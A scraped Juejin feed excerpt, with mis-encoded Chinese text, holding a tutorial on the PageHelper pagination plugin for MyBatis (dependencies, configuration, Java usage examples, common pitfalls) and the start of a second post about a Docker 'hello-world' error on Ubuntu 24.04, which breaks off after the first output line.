<h4 data-id="heading-2"><strong>ä¸»è¦ä½œç”¨ï¼š</strong></h4>
<ol>
<li><strong>è‡ªåŠ¨åˆ†é¡µ</strong> - æ‹¦æˆªæŸ¥è¯¢ SQLï¼Œè‡ªåŠ¨æ·»åŠ åˆ†é¡µè¯­å¥</li>
<li><strong>ç®€åŒ–ä»£ç </strong> - å‡å°‘é‡å¤çš„åˆ†é¡µé€»è¾‘ç¼–å†™</li>
<li><strong>ç»Ÿä¸€ç®¡ç†</strong> - æä¾›ç»Ÿä¸€çš„åˆ†é¡µæ•°æ®è¿”å›æ ¼å¼</li>
<li><strong>å¤šæ•°æ®åº“æ”¯æŒ</strong> - è‡ªåŠ¨é€‚é…ä¸åŒæ•°æ®åº“çš„åˆ†é¡µè¯­æ³•</li>
</ol>
<hr/>
<h3 data-id="heading-3"><strong>äºŒã€å¿«é€Ÿä½¿ç”¨ç¤ºä¾‹</strong></h3>
<h4 data-id="heading-4"><strong>åŸºç¡€ä½¿ç”¨ï¼š</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. è®¾ç½®åˆ†é¡µå‚æ•°ï¼ˆç¬¬2é¡µï¼Œæ¯é¡µ10æ¡ï¼‰</span>
PageHelper.startPage(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>);

<span class="hljs-comment">// 2. æ‰§è¡ŒæŸ¥è¯¢ï¼ˆä¼šè‡ªåŠ¨åˆ†é¡µï¼‰</span>
List&lt;User&gt; userList = userMapper.selectAll();

<span class="hljs-comment">// 3. è·å–åˆ†é¡µä¿¡æ¯</span>
PageInfo&lt;User&gt; pageInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(userList);

<span class="hljs-comment">// ä½¿ç”¨åˆ†é¡µæ•°æ®</span>
System.out.println(<span class="hljs-string">"å½“å‰é¡µï¼š"</span> + pageInfo.getPageNum());        <span class="hljs-comment">// 2</span>
System.out.println(<span class="hljs-string">"æ¯é¡µæ¡æ•°ï¼š"</span> + pageInfo.getPageSize());     <span class="hljs-comment">// 10</span>
System.out.println(<span class="hljs-string">"æ€»è®°å½•æ•°ï¼š"</span> + pageInfo.getTotal());        <span class="hljs-comment">// æ€»æ•°æ®é‡</span>
System.out.println(<span class="hljs-string">"æ€»é¡µæ•°ï¼š"</span> + pageInfo.getPages());          <span class="hljs-comment">// æ€»é¡µæ•°</span>
System.out.println(<span class="hljs-string">"å½“å‰é¡µæ•°æ®ï¼š"</span> + pageInfo.getList());       <span class="hljs-comment">// å½“å‰é¡µçš„æ•°æ®</span>
</code></pre>
<hr/>
<h3 data-id="heading-5"><strong>ä¸‰ã€å®Œæ•´é…ç½®æŒ‡å—</strong></h3>
<h4 data-id="heading-6"><strong>1. Maven ä¾èµ–</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Spring Boot é¡¹ç›® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- é Spring Boot é¡¹ç›® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7"><strong>2. Spring Boot é…ç½®ï¼ˆapplication.ymlï¼‰</strong></h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">pagehelper:</span>
  <span class="hljs-comment"># æ•°æ®åº“æ–¹è¨€ï¼ˆè‡ªåŠ¨æ£€æµ‹å¯è®¾ä¸º autoï¼‰</span>
  <span class="hljs-attr">helper-dialect:</span> <span class="hljs-string">mysql</span>
  <span class="hljs-comment"># åˆ†é¡µåˆç†åŒ–ï¼špageNum&lt;=0 æŸ¥è¯¢ç¬¬ä¸€é¡µï¼ŒpageNum&gt;æ€»é¡µæ•°æŸ¥è¯¢æœ€åä¸€é¡µ</span>
  <span class="hljs-attr">reasonable:</span> <span class="hljs-literal">true</span>
  <span class="hljs-comment"># æ”¯æŒé€šè¿‡ Mapper æ¥å£å‚æ•°ä¼ é€’åˆ†é¡µå‚æ•°</span>
  <span class="hljs-attr">support-methods-arguments:</span> <span class="hljs-literal">true</span>
  <span class="hljs-comment"># é»˜è®¤å€¼ä¸º falseï¼Œè®¾ä¸º true æ—¶ï¼ŒRowBounds ç¬¬ä¸€ä¸ªå‚æ•° offset å½“æˆ pageNum ä½¿ç”¨</span>
  <span class="hljs-attr">offset-as-page-num:</span> <span class="hljs-literal">true</span>
  <span class="hljs-comment"># åˆ†é¡µå‚æ•°åˆç†åŒ–</span>
  <span class="hljs-attr">page-size-zero:</span> <span class="hljs-literal">false</span>
  <span class="hljs-comment"># é»˜è®¤ä¸º falseï¼Œè®¾ä¸º true å…è®¸ pageSize=0 æŸ¥è¯¢å…¨éƒ¨ç»“æœ</span>
  <span class="hljs-attr">params:</span> <span class="hljs-string">count=countSql</span>
</code></pre>
<hr/>
<h3 data-id="heading-8"><strong>å››ã€å¤šç§ä½¿ç”¨æ–¹å¼</strong></h3>
<h4 data-id="heading-9"><strong>æ–¹å¼1ï¼šåŸºæœ¬åˆ†é¡µæŸ¥è¯¢</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> PageInfo&lt;User&gt; <span class="hljs-title function_">findUsers</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    <span class="hljs-comment">// å¼€å§‹åˆ†é¡µ</span>
    PageHelper.startPage(pageNum, pageSize);
    
    <span class="hljs-comment">// æŸ¥è¯¢æ•°æ®ï¼ˆè‡ªåŠ¨åˆ†é¡µï¼‰</span>
    List&lt;User&gt; list = userMapper.selectByExample(<span class="hljs-literal">null</span>);
    
    <span class="hljs-comment">// åŒ…è£…åˆ†é¡µç»“æœ</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(list);
}
</code></pre>
<h4 data-id="heading-10"><strong>æ–¹å¼2ï¼šå¸¦æ¡ä»¶çš„åˆ†é¡µæŸ¥è¯¢</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> PageInfo&lt;User&gt; <span class="hljs-title function_">findUsersByCondition</span><span class="hljs-params">(UserQuery query, <span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    PageHelper.startPage(pageNum, pageSize);
    
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(User.class);
    <span class="hljs-keyword">if</span> (StringUtils.isNotBlank(query.getName())) {
        example.createCriteria().andLike(<span class="hljs-string">"name"</span>, <span class="hljs-string">"%"</span> + query.getName() + <span class="hljs-string">"%"</span>);
    }
    
    List&lt;User&gt; list = userMapper.selectByExample(example);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(list);
}
</code></pre>
<h4 data-id="heading-11"><strong>æ–¹å¼3ï¼šè¿”å› Page å¯¹è±¡</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Page&lt;User&gt; <span class="hljs-title function_">findUsersPage</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    PageHelper.startPage(pageNum, pageSize);
    
    <span class="hljs-comment">// Page æ˜¯ ArrayList çš„å­ç±»ï¼Œè‡ªå¸¦åˆ†é¡µä¿¡æ¯</span>
    Page&lt;User&gt; page = (Page&lt;User&gt;) userMapper.selectAll();
    
    <span class="hljs-comment">// å¯ä»¥ç›´æ¥è·å–åˆ†é¡µä¿¡æ¯</span>
    System.out.println(<span class="hljs-string">"æ€»æ•°ï¼š"</span> + page.getTotal());
    <span class="hljs-keyword">return</span> page;
}
</code></pre>
<h4 data-id="heading-12"><strong>æ–¹å¼4ï¼šä½¿ç”¨ RowBoundsï¼ˆä¸æ¨èï¼‰</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸ä¾µå…¥ä»£ç çš„æ–¹å¼</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findUsersWithRowBounds</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span> {
    <span class="hljs-type">RowBounds</span> <span class="hljs-variable">rowBounds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RowBounds</span>((pageNum-<span class="hljs-number">1</span>)*pageSize, pageSize);
    <span class="hljs-keyword">return</span> userMapper.selectByRowBounds(<span class="hljs-literal">null</span>, rowBounds);
}
</code></pre>
<hr/>
<h3 data-id="heading-13"><strong>äº”ã€PageInfo å¸¸ç”¨å±æ€§</strong></h3>

































































<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>getList()</code></td><td>å½“å‰é¡µæ•°æ®åˆ—è¡¨</td><td><code>List&lt;T&gt;</code></td></tr><tr><td><code>getTotal()</code></td><td>æ€»è®°å½•æ•°</td><td>100</td></tr><tr><td><code>getPages()</code></td><td>æ€»é¡µæ•°</td><td>10</td></tr><tr><td><code>getPageNum()</code></td><td>å½“å‰é¡µç </td><td>1</td></tr><tr><td><code>getPageSize()</code></td><td>æ¯é¡µæ•°é‡</td><td>10</td></tr><tr><td><code>isFirstPage()</code></td><td>æ˜¯å¦ç¬¬ä¸€é¡µ</td><td>true</td></tr><tr><td><code>isLastPage()</code></td><td>æ˜¯å¦æœ€åä¸€é¡µ</td><td>false</td></tr><tr><td><code>isHasNextPage()</code></td><td>æ˜¯å¦æœ‰ä¸‹ä¸€é¡µ</td><td>true</td></tr><tr><td><code>isHasPreviousPage()</code></td><td>æ˜¯å¦æœ‰ä¸Šä¸€é¡µ</td><td>false</td></tr><tr><td><code>getNavigatePages()</code></td><td>å¯¼èˆªé¡µç æ•°</td><td>8</td></tr><tr><td><code>getNavigatepageNums()</code></td><td>å¯¼èˆªé¡µç æ•°ç»„</td><td>[1,2,3,4,5,6,7,8]</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-14"><strong>å…­ã€è¿›é˜¶ç”¨æ³•</strong></h3>
<h4 data-id="heading-15"><strong>1. æ’åºåŠŸèƒ½</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨å‚æ•°æ’åº</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-string">"create_time desc"</span>);

<span class="hljs-comment">// æ–¹å¼2ï¼šä½¿ç”¨ OrderBy æ–¹æ³•</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)
         .setOrderBy(<span class="hljs-string">"age asc, name desc"</span>);

List&lt;User&gt; list = userMapper.selectAll();
</code></pre>
<h4 data-id="heading-16"><strong>2. åªç»Ÿè®¡æ•°é‡ä¸åˆ†é¡µ</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åªè¿›è¡Œ count æŸ¥è¯¢</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// pageSize=0 æ—¶åªæŸ¥è¯¢æ€»æ•°</span>
<span class="hljs-type">long</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> ((Page&lt;?&gt;) userMapper.selectAll()).getTotal();
</code></pre>
<h4 data-id="heading-17"><strong>3. åˆ†é¡µæ‹¦æˆªå™¨è®¾ç½®å‚æ•°</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯ä»¥åœ¨ä»£ç ä¸­åŠ¨æ€è®¾ç½®å‚æ•°</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)
    .setCount(<span class="hljs-literal">true</span>)           <span class="hljs-comment">// æ˜¯å¦è¿›è¡Œ count æŸ¥è¯¢</span>
    .setReasonable(<span class="hljs-literal">false</span>)     <span class="hljs-comment">// å…³é—­åˆç†åŒ–</span>
    .setPageSizeZero(<span class="hljs-literal">true</span>);   <span class="hljs-comment">// å…è®¸ pageSize=0</span>
</code></pre>
<hr/>
<h3 data-id="heading-18"><strong>ä¸ƒã€å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></h3>
<h4 data-id="heading-19"><strong>é—®é¢˜1ï¼šåˆ†é¡µä¸ç”Ÿæ•ˆ</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯å†™æ³•ï¼šä¸­é—´æœ‰å…¶ä»–æŸ¥è¯¢</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
userMapper.countAll();  <span class="hljs-comment">// è¿™ä¸ªæŸ¥è¯¢ä¼šè¢«åˆ†é¡µ</span>
List&lt;User&gt; list = userMapper.selectAll();  <span class="hljs-comment">// è¿™ä¸ªä¸ä¼šåˆ†é¡µ</span>

<span class="hljs-comment">// âœ… æ­£ç¡®å†™æ³•ï¼šç´§é‚»æŸ¥è¯¢è¯­å¥</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
List&lt;User&gt; list = userMapper.selectAll();  <span class="hljs-comment">// è¿™ä¸ªä¼šåˆ†é¡µ</span>
</code></pre>
<h4 data-id="heading-20"><strong>é—®é¢˜2ï¼šè‡ªå®šä¹‰ count æŸ¥è¯¢</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- åœ¨ Mapper.xml ä¸­å®šä¹‰ count æŸ¥è¯¢ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectComplexCount"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"long"</span>&gt;</span>
    SELECT COUNT(*) FROM user WHERE status = 1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰ count æŸ¥è¯¢</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)
    .setCountId(<span class="hljs-string">"selectComplexCount"</span>);
</code></pre>
<h4 data-id="heading-21"><strong>é—®é¢˜3ï¼šå¤šè¡¨å…³è”æŸ¥è¯¢åˆ†é¡µ</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯¹äºå¤æ‚æŸ¥è¯¢ï¼Œå¯ä»¥åœ¨ SQL ä¸­ä½¿ç”¨ PageHelper</span>
PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
<span class="hljs-comment">// è‡ªå·±å†™ JOIN æŸ¥è¯¢çš„ SQL</span>
List&lt;UserDTO&gt; list = userMapper.selectUserWithRole();
</code></pre>
<hr/>
<h3 data-id="heading-22"><strong>å…«ã€ä¸ MyBatis-Plus å¯¹æ¯”</strong></h3>



































<table><thead><tr><th>ç‰¹æ€§</th><th>PageHelper</th><th>MyBatis-Plus</th></tr></thead><tbody><tr><td><strong>ä¾µå…¥æ€§</strong></td><td>æ— ä¾µå…¥</td><td>éœ€è¦ç»§æ‰¿ BaseMapper</td></tr><tr><td><strong>ä½¿ç”¨æ–¹å¼</strong></td><td>ThreadLocal</td><td>ä¼ å…¥ Page å¯¹è±¡</td></tr><tr><td><strong>åŠŸèƒ½èŒƒå›´</strong></td><td>ä¸“æ³¨åˆ†é¡µ</td><td>å…¨å¥— CRUD+åˆ†é¡µ</td></tr><tr><td><strong>å­¦ä¹ æˆæœ¬</strong></td><td>ä½</td><td>ä¸­ç­‰</td></tr><tr><td><strong>çµæ´»æ€§</strong></td><td>é«˜</td><td>ä¸­ç­‰</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-23"><strong>ä¹ã€æœ€ä½³å®è·µå»ºè®®</strong></h3>
<ol>
<li><strong>æœåŠ¡å±‚å°è£…</strong></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageUtils</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; PageResult&lt;T&gt; <span class="hljs-title function_">toPageResult</span><span class="hljs-params">(PageInfo&lt;T&gt; pageInfo)</span> {
        PageResult&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageResult</span>&lt;&gt;();
        result.setData(pageInfo.getList());
        result.setTotal(pageInfo.getTotal());
        result.setPageNum(pageInfo.getPageNum());
        result.setPageSize(pageInfo.getPageSize());
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<ol start="2">
<li><strong>ç»Ÿä¸€è¿”å›æ ¼å¼</strong></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageResult</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> List&lt;T&gt; data;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> total;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pageNum;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pageSize;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pages;
}
</code></pre>
<ol start="3">
<li><strong>Controller ä½¿ç”¨</strong></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/users")</span>
<span class="hljs-keyword">public</span> Result <span class="hljs-title function_">listUsers</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(defaultValue = "1")</span> <span class="hljs-type">int</span> pageNum,
                        <span class="hljs-meta">@RequestParam(defaultValue = "10")</span> <span class="hljs-type">int</span> pageSize)</span> {
    PageInfo&lt;User&gt; pageInfo = userService.findUsers(pageNum, pageSize);
    <span class="hljs-keyword">return</span> Result.success(PageUtils.toPageResult(pageInfo));
}
</code></pre>
<hr/>
<h3 data-id="heading-24"><strong>æ€»ç»“</strong></h3>
<p>PageHelper æ˜¯ä¸€ä¸ªéå¸¸å®ç”¨çš„ MyBatis åˆ†é¡µæ’ä»¶ï¼Œé€šè¿‡ç®€å•çš„ <code>PageHelper.startPage()</code> è°ƒç”¨å³å¯å®ç°å¤æ‚çš„åˆ†é¡µåŠŸèƒ½ã€‚ä½¿ç”¨æ—¶æ³¨æ„ï¼š</p>
<ol>
<li>ç¡®ä¿ <code>startPage()</code> ç´§é‚»æŸ¥è¯¢è¯­å¥</li>
<li>åˆç†é…ç½®æ•°æ®åº“æ–¹è¨€</li>
<li>æ ¹æ®éœ€æ±‚é€‰æ‹©åˆé€‚çš„è¿”å›ç±»å‹ï¼ˆPageInfo æˆ– Pageï¼‰</li>
<li>å¯¹äºå¤æ‚æŸ¥è¯¢è€ƒè™‘è‡ªå®šä¹‰ count è¯­å¥</li>
</ol>
<p>ç†Ÿç»ƒæŒæ¡ PageHelper å¯ä»¥æå¤§æå‡å¼€å‘æ•ˆç‡å’Œä»£ç å¯ç»´æŠ¤æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ubuntuç³»ç»Ÿdockeré”™è¯¯ï¼Œfailed to do request: Head "https://registry-1.docker.io/v2/...]]></title>    <link>https://juejin.cn/post/7595400254346936335</link>    <guid>https://juejin.cn/post/7595400254346936335</guid>    <pubDate>2026-01-15T09:03:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595400254346936335" data-draft-id="7595400254346788879" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ubuntuç³»ç»Ÿdockeré”™è¯¯ï¼Œfailed to do request: Head &quot;https://registry-1.docker.io/v2/..."/> <meta itemprop="keywords" content="Docker"/> <meta itemprop="datePublished" content="2026-01-15T09:03:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·9381691255360"/> <meta itemprop="url" content="https://juejin.cn/user/3485906645565271"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ubuntuç³»ç»Ÿdockeré”™è¯¯ï¼Œfailed to do request: Head "https://registry-1.docker.io/v2/...
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485906645565271/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·9381691255360
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:03:27.000Z" title="Thu Jan 15 2026 09:03:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘çš„Ubuntuç³»ç»Ÿçš„ç‰ˆæœ¬æ˜¯<strong>24.04.3 LTS</strong>â€Œï¼ˆä»£å·Noble Numbatï¼‰ã€‚<br/>
ä»Šå¤©é€šè¿‡å‚è€ƒå®˜ç½‘<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.docker.com%2Fengine%2Finstall%2Fubuntu%2F%23install-from-a-package" target="_blank" title="https://docs.docker.com/engine/install/ubuntu/#install-from-a-package" ref="nofollow noopener noreferrer">Install Docker Engine on Ubuntu</a>å®‰è£…dockerã€‚åœ¨æœ€åéªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸè¿™ä¸€æ­¥æ˜¯å‘ç”Ÿäº†é”™è¯¯ã€‚å®˜ç½‘è¦æ±‚è¿è¡Œhello-worldé•œåƒ<code>sudo docker run hello-world</code>ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">ubuntu@VM-<span class="hljs-number">0</span>-<span class="hljs-number">11</span>-ubuntu:/var/docker-install$ sudo docker run hello-world
Unable <span class="hljs-keyword">to</span> find image <span class="hljs-comment">'hello-world:latest' locally</span>
